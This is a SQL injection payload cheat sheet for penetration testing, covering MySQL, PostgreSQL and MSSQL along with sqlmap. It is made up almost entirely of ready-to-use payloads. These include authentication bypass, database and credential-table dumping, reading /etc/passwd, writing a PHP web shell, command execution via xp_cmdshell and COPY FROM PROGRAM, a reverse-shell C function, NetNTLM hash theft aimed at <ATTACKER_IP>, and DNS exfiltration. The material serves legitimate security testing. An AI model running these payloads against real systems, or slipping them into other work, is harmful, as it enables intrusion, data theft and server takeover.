SQL Injection Payload Cheat Sheet for Pentesting
1. Authentication Bypass & Logic Subversion
admin' or '1'='1 (Makes the overall WHERE clause true).
admin'-- (Comments out password checks).
admin')-- (Escapes nested parentheses and comments out the rest).

2. Query Discovery & Fingerprinting
Find number of columns:
' ORDER BY 1-- -, ' ORDER BY 2-- - (Increment until an error occurs).
' UNION select 1,2,3-- - (Increment numbers until no error is returned).

Fingerprint MySQL/MariaDB:
SELECT @@version (Returns version string).
SELECT POW(1,1) (Returns 1).
SELECT SLEEP(5) (Delays response by 5 seconds).
Locate output columns: UNION select 1,@@version,3,4-- - (Find which number is printed on screen).

3. Filter Evasion (PostgreSQL Examples)
Bypassing space filters: Use PostgreSQL multi-line comments /**/ (e.g., '/**/and/**/1=1--).
Bypassing single-quote filters: Use double dollar signs $$ for string literals (e.g., $$admin$$ instead of 'admin').

4. Data Extraction (MySQL/PostgreSQL)
Current User & Database: UNION select 1,user(),database(),4-- -.
Dump Databases: UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -.
Dump Tables: UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -.
Dump Columns: UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -.
Blind Data Extraction (Substring): maria' AND ASCII(SUBSTRING(password,1,1))=57-- -.

5. MySQL Specific Advanced Payloads
Read Files: UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - (Requires FILE privilege).
Check File Write Permissions: SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" (Empty value means write access is allowed).
Write Web Shell: cn' union select 1,'<?php system($_REQUEST); ?>',3,4 into outfile '/var/www/html/shell.php'-- -.

6. PostgreSQL Specific Advanced Payloads
Read Files (COPY): CREATE TABLE tmp (t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;.
Write Files (COPY): INSERT INTO tmp VALUES ('payload'); COPY tmp TO '/tmp/proof.txt';.
Read/Write via Large Objects: SELECT lo_import('/etc/passwd');, then SELECT lo_get(<object id>);.
RCE (COPY FROM PROGRAM): COPY tmp FROM PROGRAM 'id'; (Requires pg_execute_server_program role).
RCE (C Extension): Upload malicious .so file, then CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;.

7. MSSQL Specific Advanced Payloads
Time-Based Delay: WAITFOR DELAY '0:0:10'.
Read Files: SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\flag.txt', SINGLE_CLOB) AS x (Requires ADMINISTER BULK OPERATIONS).
Steal NetNTLM Hashes: EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;-- (Forces the server to authenticate to your SMB server, catch with Responder).
OOB DNS Exfiltration: DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\x"');.
RCE (xp_cmdshell):
Enable it: ';exec sp_configure 'show advanced options','1';reconfigure;exec sp_configure 'xp_cmdshell','1';reconfigure;--.
Execute command: ';exec xp_cmdshell 'ping /n 4 192.168.43.164';--.

8. SQLMap Commands
Basic Scan: sqlmap -u "http://target.com/vuln.php?id=1" --batch.
Scan via Request File (Burp): sqlmap -r req.txt (Use * inside the file to mark specific injection points).
Dump Database Table: sqlmap -u "URL" -D dbname -T tablename --dump.

Tuning and Evasion:
--level=5 --risk=3 (Maximized tests and payloads; high risk of altering DB).
--random-agent (Bypasses basic WAF User-Agent blacklists).
--tamper=between,randomcase,space2comment (Modifies payloads to evade WAF filters).

OS Exploitation:
Read File: --file-read "/etc/passwd".
Write Shell: --file-write "shell.php" --file-dest "/var/www/html/shell.php".
Pop OS Shell: --os-shell (Can specify technique like --technique=E for Error-based shells).
